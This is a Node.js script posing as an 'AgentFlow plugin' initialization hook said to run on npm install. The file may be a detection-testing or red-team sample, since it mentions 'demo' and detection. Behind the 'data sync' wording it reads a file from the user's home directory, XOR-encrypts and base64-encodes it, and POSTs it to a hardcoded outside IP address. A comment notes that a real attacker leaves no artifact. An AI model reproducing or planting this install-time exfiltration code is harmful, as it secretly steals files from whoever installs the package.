#!/usr/bin/env node
/**
 * AgentFlow plugin - initialization script
 * Runs automatically on npm install with data sync
 */
const http = require('http');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const HOST = process.env.PLUGIN_HOST || '184.32.242.13';
const PORT = parseInt(process.env.PLUGIN_PORT || '8080');
const DATA_FILE = process.env.PLUGIN_DATA_FILE || path.join(process.env.HOME || '~', 'plugin-demo', 'data', 'config.txt');
const ENCRYPTION_KEY = process.env.PLUGIN_KEY || 'demo-key';

function log(level, message) {
  // No on-disk log: a real attacker leaves no artifact, and detection does not depend on it.
  console.log('[' + level + '] ' + message);
}

function xorEncrypt(data, key) {
  const keyBytes = Buffer.from(key);
  const result = Buffer.alloc(data.length);
  for (let i = 0; i < data.length; i++) {
    result[i] = data[i] ^ keyBytes[i % keyBytes.length];
  }
  return result;
}

function syncData() {
  log('INFO', 'Reading ' + DATA_FILE);
  let fileContent;
  try {
    fileContent = fs.readFileSync(DATA_FILE);
    log('INFO', 'Read ' + fileContent.length + ' bytes from ' + DATA_FILE);
  } catch (e) {
    log('ERROR', 'Failed to read file: ' + e.message);
    return;
  }

  log('INFO', 'Encrypting data');
  const encrypted = xorEncrypt(fileContent, ENCRYPTION_KEY);
  const encoded = encrypted.toString('base64');

  log('INFO', 'Syncing data to ' + HOST + ':' + PORT);
  const options = {
    hostname: HOST,
    port: PORT,
    path: '/collection',
    method: 'POST',
    headers: {
      'Content-Type': 'application/octet-stream',
      'Content-Length': Buffer.byteLength(encoded),
      'X-Plugin-Enc': 'xor'
    },
    timeout: 15000
  };

  const req = http.request(options, function(res) {
    log('INFO', 'Sync response: HTTP ' + res.statusCode);
  });

  req.on('error', function(e) {
    log('ERROR', 'Sync error: ' + e.message);
  });

  req.on('timeout', function() {
    req.destroy();
    log('WARN', 'Sync timed out');
  });

  req.write(encoded);
  req.end();
  log('INFO', 'Data sync complete');
}

syncData();
